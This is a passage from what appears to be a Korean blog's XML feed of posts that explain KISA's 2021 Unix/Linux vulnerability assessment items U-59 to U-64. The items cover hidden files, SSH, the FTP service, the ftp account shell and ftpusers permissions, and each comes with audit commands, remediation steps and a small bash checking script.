class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt;&gt; /root/result/u-59.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt;&gt; /root/result/u-59.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt;&gt; /root/result/u-59.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[디렉터리 점검]&quot;</span> &gt;&gt; /root/result/u-59.txt</span><br><span class="line">directory=`find / -<span class="built_in">type</span> d -name <span class="string">&quot;.*&quot;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$directory</span>&quot;</span> &gt;&gt; /root/result/u-59.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-59 [숨겨진 파일 및 디렉터리 검색 및 제거] : /root/result/u-59.txt 파일 확인</span><br></pre></td></tr></table></figure>

<br>

<p>숨겨진 파일 및 디렉터리를 찾고 그 내용을 <code>/root/result/u-59.txt</code> 파일에 입력해주었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-59/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-60 ssh 원격접속 허용</title>
    <url>/2022/01/24/2022-01-24-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-60%20ssh%20%EC%9B%90%EA%B2%A9%EC%A0%91%EC%86%8D%20%ED%97%88%EC%9A%A9/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>원격 접속 시 <code>SSH</code> 프로토콜을 사용하는지 점검합니다.</p>
<p>항목코드는 <code>U-60</code>이며, 항목 주요도는 <code>중</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>비교적 안전한 <code>SSH</code> 프로토콜을 사용함으로써 스티핑 등 아이디/패스워드의 유출의 방지를 목적으로 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>원격 접속 시 <code>Telnet</code> <code>FTP</code> 등은 암호화되지 않은 상태로 데이터를 전송하기 때문에 아이디/패스워드 및 중요 정보가 외부로 유출될 위험성이 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 원격 접속 시 <code>SSH</code> 프로토콜을 사용하는 경우 (<code>SSH</code> <code>TELNET</code>이 동시에 설치되어 있는 경우 취약으로 평가)</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 원격 접속 시 <code>TELNET</code> <code>FTP</code> 등 안전하지 않은 프로토콜을 사용하는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) <code>Telnet</code> <code>FTP</code> 서비스 실행 확인<br />    <code># ps -ef | grep &quot;telnet.socket&quot; | grep -v &quot;grep&quot;</code><br />    <code># ps -ef |grep &quot;vsftpd&quot; |grep -v &quot;grep&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ps -ef | grep &quot;telnet.socket&quot; | grep -v &quot;grep&quot;</p>
<p># ps -ef | grep &quot;vsftpd&quot; | grep -v &quot;grep&quot;</p>
</blockquote>
<br>

<p><code>Telnet</code> <code>FTP</code> 서비스가 실행중인지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-60/ps.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) <code>SSH</code> 서비스 활성화 명령어 실행<br /><br />&lt; SOLARIS 5.9 이하 버전 &gt;<br />    <code># /etc/init.d/sshd start</code><br />&lt; SOLARIS 5.10 이상 버전 &gt;<br />    <code># svcadm enable ssh</code><br /><br />&lt; LINUX &gt;<br />    <code># service start sshd</code> 또는 <code># service start ssh</code><br /><br />&lt; AIX &gt;<br />    <code># startsrc -s sshd</code><br /><br />&lt; HP-UX &gt;<br />    <code># /sbin/init.d/secsh start</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`ps -ef | grep <span class="string">&quot;telnet.socket&quot;</span> | grep -v <span class="string">&quot;grep&quot;</span>`</span><br><span class="line">process2=`ps -ef | grep <span class="string">&quot;vsftpd&quot;</span> | grep -v <span class="string">&quot;grep&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ] || [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-60 [ssh 원격접속 허용] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-60.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>Telnet</code> <code>FTP</code> 서비스가 활성화 상태이면 <code>취약</code>, 아니면 <code>양호</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-60</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-60/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-61 ftp 서비스 확인</title>
    <url>/2022/01/24/2022-01-24-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-61%20ftp%20%EC%84%9C%EB%B9%84%EC%8A%A4%20%ED%99%95%EC%9D%B8/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>FTP</code> 서비스가 활성화 되어있는지 점검합니다.</p>
<p>항목코드는 <code>U-61</code>이며, 항목 주요도는 <code>하</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>취약한 서비스인 <code>FTP</code> 서비스를 가급적 제한함을 목적으로 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p><code>FTP</code> 서비스는 통신구간이 평문으로 전송되어 계정정보 및 전송 데이터의 스니핑이 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>FTP</code> 서비스가 비활성화 되어 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>FTP</code> 서비스가 활성화 되어 있는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />AIX,<br />HP-UX</td>
<td>1) 일반 <code>FTP</code> 서비스 비활성화 여부 확인<br />    <code># vi /etc/inetd.conf</code><br /><br />2) <code>proftpd</code> 서비스 데몬 확인<br />    <code># ps -ef | grep proftpd</code><br /><br />3) <code>vsftpd</code> 서비스 데몬 확인<br />    <code># ps -ef | egrep &quot;vsftpd|proftp&quot;</code></td>
</tr>
<tr>
<td>LINUX</td>
<td>1) 일반 <code>FTP</code> 서비스 비활성화 여부 확인<br />    <code># ps -ef | grep ftp</code><br /><br />2) <code>vsftpd</code> 또는 <code>ProFTP</code> 서비스 데몬 확인<br />    <code># ps -ef | egrep &quot;vsftpd|proftp&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ps -ef | grep ftp | grep -v &quot;grep&quot;</p>
<p># ps -ef | egrep &quot;vsftpd|proftp&quot; | grep -v &quot;grep&quot;</p>
</blockquote>
<br>

<p><code>FTP</code> 서비스가 실행중인지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-61/ps.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />AIX,<br />HP-UX</td>
<td><strong>&lt; 일반 FTP 서비스 중지 방법 &gt;</strong><br />1) <code>/etc/inetd.conf</code> 파일에서 <code>FTP</code> 서비스 라인 주석처리<br />    (수정 전) <code>ftp stream tcp nowait bin /usr/sbin/in.ftpd in.fingerd -a</code><br />    (수정 후) <code>#ftp stream tcp nowait bin /usr/sbin/in.ftpd in.fingerd -a</code><br /><br />2) <code>inetd</code> 서비스 재시작<br />    <code># ps -ef | grep inetd</code><br />    <code># kill -HUP [PID]</code><br /><br /><strong>&lt; SOLARIS 5.10 이상 버전&gt;</strong><br />    <code># svcs | grep ftp</code><br />    <code># svcadm disable svc:/network/ftp:default</code></td>
</tr>
<tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><strong>&lt; vsFTP, ProFTP 서비스 중지 방법&gt;</strong><br />1) 서비스 확인<br />    <code># ps -ef | egrep &quot;vsftpd|proftpd&quot;</code><br /><br />2) <code>vsftpd</code> 또는 <code>ProFTP</code> 서비스 데몬 중지<br />    <code># service vsftpd(proftp) stop</code> 또는 <code>/etc/rc.d/init.d/vsftpd(proftp) stop</code> 또는 <code>kill -9 [PID]</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`ps -ef | grep ftp | grep -v <span class="string">&quot;grep&quot;</span>`</span><br><span class="line">process2=`ps -ef | egrep <span class="string">&quot;vsftpd|proftp&quot;</span> | grep -v <span class="string">&quot;grep&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ] || [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-61 [FTP 서비스 확인] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-61.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>FTP</code> 서비스가 활성화 상태이면 <code>취약</code>, 아니면 <code>양호</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-61</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-61/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-62 ftp 계정 shell 제한</title>
    <url>/2022/01/24/2022-01-24-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-62%20ftp%20%EA%B3%84%EC%A0%95%20shell%20%EC%A0%9C%ED%95%9C/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>FTP</code> 기본 계정에 쉘 설정 여부 점검입니다.</p>
<p>항목코드는 <code>U-62</code>이며, 항목 주요도는 <code>중</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p><code>FTP</code> 서비스 설치 시 기본적으로 생성되는 <code>ftp</code> 계정은 로그인이 필요하지 않은 계정으로 쉘을 제한하여 해당 계정으로의 시스템 접근을 차단하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>불필요한 기본 계정에 쉘을 부여할 경우 공격자에게 해당 계정이 노출되어 <code>ftp</code> 기본 계정으로 시스템 접근하여 공격이 가능해집니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>ftp</code> 계정에 <code>/bin/false</code> 쉘이 부여되어 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>ftp</code> 계정에 <code>/bin/false</code> 쉘이 부여되어 있는 않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>ftp</code> 계정에 대한 <code>/bin/false</code> 부여 확인<br />    <code># cat /etc/passwd</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/passwd | grep &quot;ftp&quot;</p>
</blockquote>
<br>

<p><code>ftp</code> 계정의 쉘을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-62/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/passwd</code> 파일 열기<br /><br />2) <code>ftp</code> 계정의 로그인 쉘 부분인 계정 맨 마지막에 <code>/bin/false</code> 부여 및 변경<br /><br />3) <code># usermod -s /bin/false [계정 ID]</code> 부여로 변경 가능</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/passwd | grep <span class="string">&quot;ftp&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *<span class="string">&quot;/bin/false&quot;</span>* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-62 [ftp 계정 shell 제한] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-62.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>ftp</code> 계정에 <code>/bin/false</code> 쉘이 부여되어 있는 경우 <code>양호</code>, 아니면 <code>취약</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-62</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-62/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-63 ftpusers 파일 소유자 및 권한 설정</title>
    <url>/2022/01/24/2022-01-24-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-63%20ftpusers%20%ED%8C%8C%EC%9D%BC%20%EC%86%8C%EC%9C%A0%EC%9E%90%20%EB%B0%8F%20%EA%B6%8C%ED%95%9C%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>FTP</code> 접근제어 설정파일에 관리자 외 비인가자들이 수정 제한 여부 점검입니다.</p>
<p>항목코드는 <code>U-63</code>이며, 항목 주요도는 <code>하</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>비인가자들의 <code>FTP</code> 접속을 차단하기 위해 <code>ftpusers</code> 파일 소유자 및 권한을 관리해야합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p><code>ftpusers</code> 파일에 인가되지 않은 사용자를 등록하여 해당 계정을 이용, 불법적인 <code>FTP</code> 서비스에 접근이 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>ftpusers</code> 파일의 소유자가 root 이고 권한이 640 이하인 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>ftpusers</code> 파일의 소유자가 root가 아니거나 권한이 640 이하가 아닌 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>ftpusers</code> 파일에 대한 일반사용자 쓰기권한 확인<br />    <code># ls -al /etc/ftpusers</code><br />    <code># ls -al /etc/ftpd/ftpusers</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ls -al /etc/vsftpd/ftpusers</p>
</blockquote>
<br>

<p><code>ftpusers</code> 파일의 소유자와 권한을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-63/ls.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) <code>/etc/ftpusers</code> 파일의 소유자 및 권한 확인<br />    <code># ls -l /etc/ftpusers</code><br /><br />2) <code>/etc/ftpusers</code> 파일의 소유자 및 권한 변경<br />    <code># chown root /etc/ftpusers</code><br />    <code># chmod 640 /etc/ftpusers</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`find / -name ftpusers`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        process2=`find <span class="string">&quot;<span class="variable">$process</span>&quot;</span> -user root`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                process2=`find <span class="string">&quot;<span class="variable">$process</span>&quot;</span> -perm -641`</span><br><span class="line">                <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line">                <span class="keyword">then</span></span><br><span class="line">                        ProcessResult=취약</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                        ProcessResult=양호</span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                ProcessResult=취약</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=<span class="string">&quot;파일 없음&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-63 [ftpusers 파일 소유자 및 권한 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-63.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>ftpusers</code> 파일 소유자가 root이고 권한이 640 이하인 경우 <code>양호</code>, 아니면 <code>취약</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-63</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-63/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-64 ftpusers 파일 설정(FTP 서비스 root 계정 접근제한)</title>
    <url>/2022/01/24/2022-01-24-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-64%20ftpusers%20%ED%8C%8C%EC%9D%BC%20%EC%84%A4%EC%A0%95(FTP%20%EC%84%9C%EB%B9%84%EC%8A%A4%20root%20%EA%B3%84%EC%A0%95%20%EC%A0%91%EA%B7%BC%EC%A0%9C%ED%95%9C)/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>FTP</code> 서비스를 사용할 경우 <code>ftpusers</code> 파일 root 계정 포함 여부 점검입니다.</p>
<p>항목코드는 <code>U-64</code>이며, 항목 주요도는 <code>중</code>입니다.</p>
<br>

<br>

<hr>
<br>

